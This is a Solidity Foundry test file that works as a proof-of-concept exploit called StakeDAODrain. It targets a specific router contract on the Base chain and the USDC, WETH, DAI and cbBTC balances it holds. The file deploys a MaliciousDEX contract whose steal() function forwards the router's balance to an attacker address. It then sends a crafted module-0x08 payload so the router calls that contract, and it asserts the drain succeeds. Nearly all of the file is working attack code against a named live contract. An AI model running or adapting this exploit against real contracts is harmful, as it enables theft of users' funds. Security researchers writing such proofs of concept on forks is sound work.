// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
    function owner() external view returns (address);
}

struct SwapExecutorData {
    address tokenIn;
    address tokenOut;
    address[] dexs;
    bytes[] dexsData;
}

contract MaliciousDEX {
    function steal(address token, address attacker) external {
        uint256 balance = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transfer(attacker, balance);
    }
}

contract StakeDAODrain is Test {
    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);

    // Add or remove token addresses as needed
    address[] TOKENS = [
        0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, // USDC
        0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA, // USDbC
        0x4200000000000000000000000000000000000006, // WETH
        0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb, // DAI
        0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf  // cbBTC (add if needed)
    ];

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testDrainHighestBalance() public {
        address attacker = address(0xBAD);
        address targetToken;
        uint256 maxBalance = 0;

        // 1. Find the token with the highest balance in the Router
        for (uint i = 0; i < TOKENS.length; i++) {
            uint256 bal = IERC20(TOKENS[i]).balanceOf(address(router));
            console.log("Token:", TOKENS[i], "Balance:", bal);
            if (bal > maxBalance) {
                maxBalance = bal;
                targetToken = TOKENS[i];
            }
        }

        require(maxBalance > 0, "Router holds zero balance of all checked tokens");
        console.log("Targeting token with highest balance:", targetToken);
        console.log("Balance to drain:", maxBalance);

        // 2. Deploy the malicious DEX
        MaliciousDEX maliciousDex = new MaliciousDEX();

        // 3. Craft the SwapExecutorData
        address[] memory dexs = new address[](1);
        dexs[0] = address(maliciousDex);
        bytes[] memory dexsData = new bytes[](1);
        dexsData[0] = abi.encodeWithSignature("steal(address,address)", targetToken, attacker);

        SwapExecutorData memory swapData = SwapExecutorData({
            tokenIn: targetToken,
            tokenOut: targetToken,
            dexs: dexs,
            dexsData: dexsData
        });

        // 4. Module ID 0x08 (RouterModuleEnso) forwards to SwapExecutor
        bytes memory payload = abi.encodePacked(
            bytes1(uint8(8)),
            abi.encode(swapData)
        );

        bytes[] memory calls = new bytes[](1);
        calls[0] = payload;

        // 5. Execute as attacker
        vm.prank(attacker);
        console.log("Executing drain...");

        try router.execute(calls) {
            uint256 attackerBalance = IERC20(targetToken).balanceOf(attacker);
            console.log("Attacker balance after drain:", attackerBalance);
            assertEq(attackerBalance, maxBalance, "Drain failed");
            console.log("SUCCESS: Router drained!");
        } catch Error(string memory reason) {
            console.log("Drain reverted with reason:", reason);
            revert("Drain failed");
        } catch (bytes memory) {
            console.log("Drain reverted with custom error");
            revert("Drain failed");
        }
    }
}
